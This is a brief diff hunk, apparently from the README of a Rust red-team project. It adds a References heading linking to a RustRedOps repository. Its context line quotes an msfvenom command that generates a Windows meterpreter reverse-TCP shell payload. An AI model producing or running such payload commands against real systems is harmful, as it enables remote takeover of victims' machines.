@@ -47,8 +47,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f rust
 
 
 
-
-
+<h2>References</h2>
+[RustRedOps](https://github.com/joaoviictorti/RustRedOps/tree/main)
 
 
   
